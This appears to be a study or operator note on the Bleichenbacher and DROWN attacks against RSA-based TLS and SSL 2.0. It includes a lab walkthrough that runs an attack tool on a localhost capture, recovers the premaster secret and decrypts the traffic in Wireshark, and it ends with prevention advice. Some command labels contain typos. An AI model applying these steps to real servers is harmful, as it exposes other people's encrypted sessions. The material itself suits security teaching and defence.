---
technique: "Bleichenbacher & DROWN"
family: "http-protocol"
severity_hint: "low"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Bleichenbacher & DROWN.md"
source_sha256: "7a1e978c07c98bb0484e38da586ff6bbdd81395613e2dac9b37f304d3270c3a9"
curator_version: 2
review_status: imported-unreviewed
---

# Bleichenbacher & DROWN

> Family: **http-protocol** · Severity hint: **low** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: java -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap`
- `python: ava -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap -executeAttack`
- `python: echo -n 21[...]a8 | awk -F '0303' '{print "0303"$2}'`

## Playbook (operator notes)

# Bleichenbacher & DROWN

### **Bleichenbacher Attack**

- **Target:** RSA encryption with **PKCS#1 padding** (used to add randomness and avoid deterministic encryption).
- **Method:** Attacker sends many modified ciphertexts → server decrypts → attacker observes if PKCS#1 padding is valid (via errors or timing).
- **Goal:** Step-by-step deduction of plaintext until it’s fully recovered.
- **TLS 1.2 context:**
    - Only applies if RSA key exchange is used.
    - Requires server flaw leaking padding validity.
- **Impact:** Can reveal the **session key**, enabling full decryption of TLS traffic.

```python
java -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap

<SNIP>
Found 1 servers from the pcap file.                                                                                                                                                           
┌─────────────┬─────────────┬────────┬─────────────┐                                                                                                                                          
│Server Number│Host Address │Hostname│Session Count│                                                                                                                                          
├─────────────┼─────────────┼────────┼─────────────┤                                                                                                                                          
│            1│127.0.0.1:443│-       │            2│                                                                                                                                          
└─────────────┴─────────────┴────────┴─────────────┘                                                                                                                                          
Do you want to check the vulnerability of the server? (y/n):                                                                                                                                  
y

<SNIP>
Found a behavior difference within the responses. The server could be vulnerable.
The server responds with a different number of protocol messages.
Vulnerable:true
Server 127.0.0.1:443 is vulnerable.
```

```python
ava -jar apps/bleichenbacher-1.0.1.jar -pcap ./bleichenbacher.pcap -executeAttack

<SNIP>
09:35:56 [main] INFO : Bleichenbacher - ====> Solution found!
 
02 14 C0 45 01 95 02 4E  E2 D0 BA 68 2B D9 2B 0A
CD 4E 83 7A 8A BC 60 EE  56 A6 4D 6F 48 FE 2D 51
1C 6A A3 CF E4 14 76 3A  AB DA 7F 4A 41 FB FE 70
D1 02 C5 68 38 55 09 96  5F 43 CC B1 86 25 AD 75
EF AB 27 E7 9C BA DB 9C  DE B5 5D CF E0 92 A1 B7
31 C5 25 9C E6 42 71 E9  AE E5 34 83 C4 38 BA 71
5D D9 6E C6 E5 69 49 C8  4B 29 0D 71 EE 70 12 66
8E 6F DD 71 6E 4E E3 26  1D 1A 98 53 D4 04 6B D7
56 98 42 71 72 2F 74 94  D1 96 27 19 EB A9 A2 BD
E8 6D 1C 3E 83 A6 32 54  64 C4 7D ED B7 E3 25 F2
B5 6D 73 37 76 51 2E EC  F5 2F 9B 25 AB 2D AD 27
E3 42 FE D1 72 0E A9 F3  C8 CC 54 8D DC A4 52 03
D1 2E B7 0D 8D 5B A8 C6  54 F5 30 6F 1F 75 00 03
03 46 E1 07 5D 56 F3 82  82 AE AC F9 E9 FA 02 7F
22 BB FB E4 A8 EC CA EF  E3 9E 5B 55 D9 4F FC 38
52 D6 AE 62 54 77 53 01  B7 19 D2 D5 E0 43 A8
09:35:56 [main] INFO : Bleichenbacher - // Total # of queries so far: 20417
214c0450195024ee2d0ba682bd92b0acd4e837a8abc60ee56a64d6f48fe2d511c6aa3cfe414763...
```

```python
echo -n 21[...]a8 | awk -F '0303' '{print "0303"$2}'
030346e1075d56f38282aeacf9e9fa027f22bbfbe4a8eccaefe39e5b55d94ffc3852d6ae6254775301b719d2d5e043a8
```

Create file with format:
`PMS_CLIENT_RANDOM <client_random> <premaster_secret>`

`Edit -> Preferences -> Protocols -> TLS` and specifying the path to the key file under `(Pre)-Master-Secret log filename`

---

### **DROWN Attack**

- **DROWN:** A variant of the Bleichenbacher attack exploiting **SSL 2.0**.
- **Execution:** Attacker intercepts many connections, then runs Bleichenbacher attack with crafted handshake messages.
- **Weakness:** SSL 2.0 relied on **export-grade ciphers** (deliberately weak for 1990s regulations), now easily breakable.
- **Extra leverage:** Old OpenSSL bugs make the attack even faster.
- **Scope:** Targets only SSL 2.0 (deprecated), but misconfigured servers may still expose it.

---

## Prevention

DROWN can be prevented by disabling SSL 2.0. Most up-to-date 
operating systems today come with crypto libraries that do not support SSL 2.0 out-of-the-box, so finding web servers vulnerable to DROWN in the wild is very rare, though there might still be a few misconfigured and out-of-date servers out there. Bleichenbacher attacks can be prevented by not revealing padding information to the TLS client. Vulnerable web servers received patches, so keeping web servers up-to-date is sufficient to protect against a plain Bleichenbacher attack.

## Source
Original note: `_raw/Web attacks/Web Attacks/HTTP Attacks/TLS-Attacks/Bleichenbacher & DROWN.md`
